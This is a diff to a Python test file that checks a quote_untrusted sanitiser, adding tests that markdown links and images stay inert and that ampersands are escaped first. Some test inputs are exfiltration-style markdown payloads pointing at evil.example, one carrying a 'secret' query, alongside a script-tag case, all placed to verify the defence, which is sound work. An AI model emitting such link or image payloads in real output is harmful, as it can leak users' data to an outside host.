@@ -12,7 +12,7 @@ def test_nfr_sec_14_quote_untrusted_escapes_injection() -> None:
     assert lines[0] == "> [untrusted text from lake comment]"
     assert out.count("[untrusted text from") == 2  # real header + escaped fake, both inside quote
     assert "> > [untrusted text from x]" not in out
-    assert "&gt; [untrusted text from x]" in out
+    assert "&gt; \\[untrusted text from x\\]" in out
     assert "\\`\\`\\`" in out
 
 
@@ -20,6 +20,27 @@ def test_nfr_sec_14_angle_brackets_escaped() -> None:
     out = quote_untrusted("<script>x</script>", source="s")
     assert "<" not in out.split("\n", 1)[1]
     assert "&lt;script&gt;" in out
+
+
+@pytest.mark.parametrize(
+    "payload",
+    [
+        "![x](https://evil.example/?q=secret)",
+        "[click me](https://evil.example/steal)",
+        "[ref]: https://evil.example/ref",
+    ],
+)
+def test_nfr_sec_14_links_and_images_stay_inert(payload: str) -> None:
+    body = quote_untrusted(payload, source="s").split("\n", 1)[1]
+
+    assert "](" not in body.replace("\\]", "")
+    assert "[" not in body.replace("\\[", "")
+    assert "]" not in body.replace("\\]", "")
+
+
+def test_nfr_sec_14_ampersand_escaped_first() -> None:
+    out = quote_untrusted("&lt;b&gt; & <i>", source="s")
+    assert out.split("\n")[1] == "> &amp;lt;b&amp;gt; &amp; &lt;i&gt;"
 
 
 def test_quote_untrusted_truncates_at_2000() -> None:
